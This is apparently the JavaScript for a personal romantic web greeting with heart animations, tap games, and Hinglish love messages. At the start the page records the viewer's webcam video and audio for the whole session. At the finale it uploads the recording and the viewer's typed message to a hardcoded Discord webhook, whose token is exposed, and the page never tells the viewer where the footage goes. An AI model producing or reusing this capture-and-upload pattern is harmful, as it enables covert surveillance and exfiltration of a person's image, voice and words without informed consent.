let musicStarted = false;
let recordingStarted = false;
let mediaRecorder;
let recordedChunks = [];
let stream;

// ========== DISCORD WEBHOOK ==========
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522204310757441598/8Top4dxtPXmuUk6Ql1ZCExIHLbonMfyzYQslYFoawdlSchpkudulrdmpsxPLeOSDapFW";
// =====================================

function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');
}

document.addEventListener('DOMContentLoaded', () => {
    // Start heart rain
    createHeartRain();

    showScreen('loginScreen');

    document.getElementById('enterBtn').addEventListener('click', () => {
        if (document.getElementById('passwordInput').value === 'Poochi') {
            showScreen('startScreen');
        } else {
            document.getElementById('loginError').textContent = 'Oops! Wrong secret... 💔';
        }
    });

    document.getElementById('startMusicBtn').addEventListener('click', startMusic);
    document.getElementById('startRecordBtn').addEventListener('click', startRecording);

    document.getElementById('giftBox').addEventListener('click', () => {
        document.getElementById('giftNote').style.display = 'block';
        document.getElementById('giftNext').style.display = 'inline-block';
    });

    setupFlowers();
    setupStars();
    setupBalloons();
    setupCandles();
    setupHearts();
    setupMemories();
    setupFinale();
});

function createHeartRain() {
    const container = document.getElementById('heartsRain');
    setInterval(() => {
        const heart = document.createElement('div');
        heart.className = 'heart-drop';
        heart.innerHTML = '❤️';
        heart.style.left = Math.random() * 100 + '%';
        heart.style.animationDuration = Math.random() * 3 + 3 + 's';
        heart.style.fontSize = Math.random() * 20 + 15 + 'px';
        container.appendChild(heart);
        setTimeout(() => heart.remove(), 6000);
    }, 300);
}

function startMusic() {
    if (musicStarted) return;
    const audio = document.getElementById('bgMusic');
    audio.play().then(() => {
        musicStarted = true;
        checkAndProceed();
    }).catch(err => {
        alert('Please tap the button again to start music 🎵');
    });
}

async function startRecording() {
    if (recordingStarted) return;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 500000 });
        recordedChunks = [];
        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
        mediaRecorder.start();
        recordingStarted = true;
        document.getElementById('recordStatus').textContent = 'Recording... 📹';
        checkAndProceed();
    } catch (err) {
        alert('Please allow camera access! ');
    }
}

function checkAndProceed() {
    if (musicStarted && recordingStarted) {
        setTimeout(() => showScreen('scene1'), 800);
    }
}

function nextScene(sceneId) {
    if (sceneId === 'scene2') initButterfly();
    showScreen(sceneId);
}

// Butterfly message
const butterflyMessage = "Jaan...Your The Best Part Of My Life😘";
function initButterfly() {
    const textDiv = document.getElementById('butterflyText');
    const nextBtn = document.getElementById('butterflyNext');
    let i = 0; textDiv.textContent = ''; nextBtn.style.display = 'none';
    const interval = setInterval(() => {
        if (i < butterflyMessage.length) {
            textDiv.textContent += butterflyMessage[i];
            i++;
        } else {
            clearInterval(interval);
            nextBtn.style.display = 'inline-block';
        }
    }, 300);
}

// Flowers
const compliments = [
    "aapki smile din ki pehli roshni ki tarah hai, jisse har andhera door ho jata hai.",
    "Jab aap saath hoti ho, na idk how, duniya thodi zyada pyaari lagti hai.",
    "jaan...apki eyes yaawwrr itni pyali hai 🫠.",
    "apki awaj sun ln to pura din set ho jata hai.",
    "Poochi Ur shoooo important for me."
];
function setupFlowers() {
    const garden = document.getElementById('flowerGarden');
    garden.innerHTML = '';
    for (let i = 0; i < 5; i++) {
        const flower = document.createElement('div'); flower.className = 'flower';
        flower.innerHTML = `<div class="flower-text">${compliments[i]}</div>`;
        flower.addEventListener('click', () => {
            if (!flower.classList.contains('bloomed')) {
                flower.classList.add('bloomed');
                if ([...document.querySelectorAll('.flower')].every(f => f.classList.contains('bloomed'))) {
                    document.getElementById('flowersNext').style.display = 'inline-block';
                }
            }
        });
        garden.appendChild(flower);
    }
}

// Stars
let starsCaught = 0;
function setupStars() {
    const field = document.getElementById('starField');
    starsCaught = 0; document.getElementById('starCounter').textContent = '0 / 5';
    field.innerHTML = '';
    for (let i = 0; i < 10; i++) createStar(field);
    setInterval(() => {
        if (document.getElementById('scene4').classList.contains('active') && field.querySelectorAll('.star').length < 8)
            createStar(field);
    }, 1500);
}
function createStar(field) {
    const star = document.createElement('div'); star.className = 'star';
    star.style.left = Math.random()*90 + '%'; star.style.top = Math.random()*-20 + '%';
    star.style.animationDuration = (Math.random()*5 + 5) + 's';
    star.addEventListener('click', () => {
        if (star.parentNode && document.getElementById('scene4').classList.contains('active')) {
            star.remove(); starsCaught++;
            document.getElementById('starCounter').textContent = starsCaught + ' / 5';
            if (starsCaught >= 5) document.getElementById('starsNext').style.display = 'inline-block';
        }
    });
    field.appendChild(star);
}

// Balloons
function setupBalloons() {
    const field = document.getElementById('balloonField');
    const colors = ['red','pink','purple','orange'];
    for (let i=0;i<8;i++) {
        const b = document.createElement('div'); b.className = 'balloon';
        b.style.background = colors[i%4];
        b.addEventListener('click', () => {
            b.classList.add('popped');
            if ([...document.querySelectorAll('.balloon')].every(bb => bb.classList.contains('popped')))
                document.getElementById('balloonsNext').style.display = 'inline-block';
        });
        field.appendChild(b);
    }
}

// Candles
function setupCandles() {
    const area = document.getElementById('candleArea');
    for (let i=0;i<5;i++) {
        const c = document.createElement('div'); c.className = 'candle';
        c.addEventListener('click', () => {
            c.classList.add('out');
            if ([...document.querySelectorAll('.candle')].every(cc => cc.classList.contains('out')))
                document.getElementById('candlesNext').style.display = 'inline-block';
        });
        area.appendChild(c);
    }
}

// Hidden Hearts (improved tap)
function setupHearts() {
    const area = document.getElementById('heartsArea');
    area.innerHTML = '';
    const heartCount = 12;
    for (let i = 0; i < heartCount; i++) {
        const heart = document.createElement('div');
        heart.className = 'heart';
        heart.style.left = (5 + Math.random() * 80) + '%';
        heart.style.top = (5 + Math.random() * 75) + '%';
        heart.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
        heart.addEventListener('click', () => {
            heart.classList.add('found');
            if ([...document.querySelectorAll('.heart')].every(h => h.classList.contains('found'))) {
                document.getElementById('heartsNext').style.display = 'inline-block';
            }
        });
        area.appendChild(heart);
    }
    const style = document.createElement('style');
    style.textContent = `.heart::before, .heart::after { background: inherit !important; }`;
    document.head.appendChild(style);
}

// Memories
const memories = [
    "Pehli baar jab apsy mila tha, esy lga laga jaise yeh mulaqaat pehle se likhi thi.",
    "apki choti choti baatein, smile, sab dil mein bas jaati hain.",
    "Jab aap gussa hoti ho, tab bhi kitni pyaari lagti ho, bas dill krta hai dekhta rahu.",
    "Har aik min apky sath koi moment ban jata hai or sary moments mery liye bhhht special hain."
];
function setupMemories() {
    const wall = document.getElementById('memoriesWall');
    wall.innerHTML = '';
    memories.forEach(text => {
        const frame = document.createElement('div'); frame.className = 'frame';
        frame.textContent = text;
        frame.addEventListener('click', () => alert(text));
        wall.appendChild(frame);
    });
    setTimeout(() => {
        document.getElementById('memoriesNext').style.display = 'inline-block';
    }, 5000);
}

// Finale – Blast + Discord Upload
function setupFinale() {
    document.getElementById('submitFinalBtn').addEventListener('click', async () => {
        const msg = document.getElementById('finalMessage').value;
        if (!msg) return alert('Kuch toh likho... 💌');

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            mediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                stream.getTracks().forEach(t => t.stop());

                const formData = new FormData();
                formData.append('file', blob, 'recording.webm');
                formData.append('content', 'Saba ka message: ' + (msg || 'No text'));

                try {
                    const res = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                    if (res.ok) {
                        // Upload success – hide form, show blast
                        document.getElementById('finaleForm').style.display = 'none';
                        document.getElementById('finaleSky').classList.add('fireworks-effect');

                        const blast = document.getElementById('blastContainer');
                        blast.style.display = 'flex';
                        // Wait for blast animation (2s) then show pigeon
                        setTimeout(() => {
                            blast.style.display = 'none';
                            const pigeon = document.getElementById('pigeonContainer');
                            pigeon.style.display = 'block';
                            const envelope = document.querySelector('.envelope-letter');
                            envelope.addEventListener('click', () => {
                                document.getElementById('grandLetter').style.display = 'block';
                                document.getElementById('letterContent').innerHTML =
                                    "Meri zindagi mein aane ke baad, sab kuch badal gaya hai.<br>Har subah apki yaad aati hai, har raat apky paas any ki wish.<br>apko dekhna, apsy baatein karna, bas yahi meri khushi hai.<br>Jab aap door hoti ho, lagta hai jaise life adhoori si hai.<br>Main hamesha apky saath rehna chahta hoon, har mushkil mein, har khushi mein.<br>Miss you more than words can say.<br><br>You are my forever.";
                            }, { once: true });
                        }, 2500);
                    } else {
                        const err = await res.json();
                        alert('Discord upload failed: ' + (err.message || 'Unknown'));
                    }
                } catch (e) {
                    alert('Network error: ' + e.message);
                }
            };
        } else {
            alert('Recording not active.');
        }
    });
}
